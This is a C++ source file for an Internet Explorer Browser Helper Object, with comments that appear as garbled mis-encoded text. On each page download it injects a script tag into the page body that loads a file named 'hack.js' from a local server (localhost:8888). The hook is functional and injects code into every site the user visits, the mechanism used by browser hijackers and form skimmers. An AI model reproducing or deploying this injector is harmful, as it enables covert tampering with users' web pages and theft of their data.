// HookBHO.cpp : Implementation of CHookBHO

#include "stdafx.h"
#include "HookBHO.h"


// CHookBHO

STDMETHODIMP CHookBHO::SetSite(IUnknown* pUnkSite)
{
	if (pUnkSite != NULL)//�򿪴���ʱ����
	{
		HRESULT hr;
		CComPtr<IServiceProvider> sp;

		hr = pUnkSite->QueryInterface(&sp);
		if (SUCCEEDED(hr) && sp)
		{
			//����ָ��IWebBrowser2��ָ��
			hr = sp->QueryService(IID_IWebBrowserApp, IID_IWebBrowser2, (void**)&m_spWebBrowser);

			if (SUCCEEDED(hr) && m_spWebBrowser)
			{
				//ע��DWebBrowserEvents2�¼���
				hr = DispEventAdvise(m_spWebBrowser);
				if (SUCCEEDED(hr))
				{
					m_fAdvised = TRUE;
				}
			}
		}
		m_spUnkSite = pUnkSite;
	}
	else//������˳�ʱ����
	{
		//ȡ��ע���¼���
		if (m_fAdvised)
		{
			DispEventUnadvise(m_spWebBrowser);
			m_fAdvised = FALSE;
		}
		//�ڴ��ͷŻ����ָ���������Դ��
		m_spWebBrowser.Release();
	}
	//���û���ʵ�֡�
	return IObjectWithSiteImpl<CHookBHO>::SetSite(pUnkSite);
}

//�ĵ�װ����ɣ�ˢ�²��ᴥ��
void STDMETHODCALLTYPE CHookBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)
{	
	BSTR url = pvarURL->bstrVal;
	CComBSTR u(url);
	MessageBox(0, u, L"the url is", MB_OK);
	HRESULT hr = S_OK;
	// ��ѯ IWebBrowser2 �ӿڡ�   
	CComQIPtr<IWebBrowser2> spTempWebBrowser = pDisp;
	
	// 
	if (spTempWebBrowser && m_spWebBrowser && m_spWebBrowser.IsEqualObject(spTempWebBrowser))
	{
		
	}
}

void STDMETHODCALLTYPE CHookBHO::OnDownloadComplete(IDispatch *pDisp, VARIANT *pvarURL)
{   
	CComBSTR url;
	HRESULT hr = m_spWebBrowser->get_LocationURL(&url);
	if (url && url.Length() > 15)//���˵�about��tab��
	{
		//MessageBox(0, url, L"current url is", MB_OK); 
		CComPtr<IDispatch>  spDispDoc;
		hr = m_spWebBrowser->get_Document(&spDispDoc); 
		if (SUCCEEDED(hr))
		{
			VARIANT sid;
			sid.vt = VT_BSTR;
			sid.bstrVal = SysAllocString(L"xiyiaoo_script_hook");
			CComQIPtr<IHTMLDocument3> doc3(spDispDoc);
			IHTMLElement *scriptElement = NULL;
			if (doc3)
			{
				doc3->getElementById(sid.bstrVal, &scriptElement);
				if (!scriptElement)//�Ƿ��Ѿ������js
				{  
					CComQIPtr<IHTMLDocument2> doc(spDispDoc);
					if (doc)
					{
						BSTR eTag = SysAllocString(L"SCRIPT");
						hr = doc->createElement(eTag, &scriptElement);
						if (SUCCEEDED(hr))
						{
							IHTMLDOMNode *scriptNode = NULL;
							hr = scriptElement->QueryInterface(IID_IHTMLDOMNode, (void **)&scriptNode);
							if (SUCCEEDED(hr))
							{
								scriptElement->setAttribute(L"id", sid);
								VARIANT style;
								style.vt = VT_BSTR;
								style.bstrVal = SysAllocString(L"text/javascript");
								scriptElement->setAttribute(L"type", style, 1);
								VARIANT url;
								url.vt = VT_BSTR;
								url.bstrVal = SysAllocString(L"http://localhost:8888/static/hack.js");
								scriptElement->setAttribute(L"src", url, 1);
								VARIANT charset;
								charset.vt = VT_BSTR;
								charset.bstrVal = SysAllocString(L"utf-8");
								scriptElement->setAttribute(L"charset", charset, 1);
								CComQIPtr<IHTMLElement> bodyElement;
								CComQIPtr<IHTMLDOMNode> bodyNode;
								hr = doc->get_body(&bodyElement);
								if (SUCCEEDED(hr))
								{
									hr = bodyElement->QueryInterface(IID_IHTMLDOMNode, (void**)&bodyNode);
									if (SUCCEEDED(hr))
									{
										bodyNode->appendChild(scriptNode, &scriptNode);//����js
									}
								}					
							}
						}
					}
				}
			}
		}
	}
}